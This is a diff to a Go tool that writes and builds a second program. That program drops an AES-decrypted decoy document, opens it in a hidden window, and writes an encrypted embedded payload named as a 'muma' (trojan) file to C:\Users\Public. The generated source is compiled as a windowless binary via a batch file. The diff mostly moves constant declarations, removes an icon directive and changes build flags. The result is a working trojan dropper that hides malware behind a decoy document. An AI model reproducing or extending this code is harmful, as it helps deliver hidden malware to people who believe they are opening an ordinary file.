@@ -1,5 +1,3 @@
-//go:generate -icon=greentree.ico
-
 package main
 
 import (
@@ -65,7 +63,6 @@ func main() {
 	AesdocfileStr := AesEncrypt(docfileStr, key)
 	SourceCode := fmt.Sprintf(`
 	package main
-
 	import (
 		"crypto/aes"
 		"crypto/cipher"
@@ -80,6 +77,9 @@ func main() {
 		mumafilename = "%s"
 		docfilename  = "%s"
 		docfilenames = "%s"
+		docfile = "%s"
+		
+		numafile = "%s"
 	)
 	
 	func main() {
@@ -87,7 +87,7 @@ func main() {
 		selfile, _ := os.Executable()
 	
 		os.Rename(selfile, "C:\\Users\\Public\\Yihsiwei.dat")
-		docfile := "%s"
+	
 		ddocfile := AesDecrypt(docfile, key)
 		f2, _ := os.Create(docfilename)
 		_, _ = f2.Write([]byte(ddocfile))
@@ -97,7 +97,6 @@ func main() {
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		//cmd2.Stdout = os.Stdout
 		_ = cmd.Start()
-		numafile := "%s"
 		f, _ := os.Create("C:\\Users\\Public\\" + mumafilename)
 		dmumafile := AesDecrypt(numafile, key)
 		_, _ = f.Write([]byte(dmumafile))
@@ -130,7 +129,6 @@ func main() {
 		orig = PKCS7UnPadding(orig)
 		return string(orig)
 	}
-
 	`, key, mumafile, docfile, "\\\\"+docfile, AesdocfileStr, AesmumafileStr)
 
 	f, _ := os.Create("outfile.go")
@@ -143,7 +141,7 @@ func main() {
 
 	batfile, _ := os.Create("Yihsiwei.bat")
 
-	_, _ = batfile.Write([]byte("go build -ldflags \"-w -s -H=windowsgui\" outfile.go"))
+	_, _ = batfile.Write([]byte("go build -ldflags \"-H=windowsgui\" outfile.go"))
 	batfile.Close()
 	exitfile("Yihsiwei.bat")
 	time.Sleep(time.Duration(1) * time.Second)
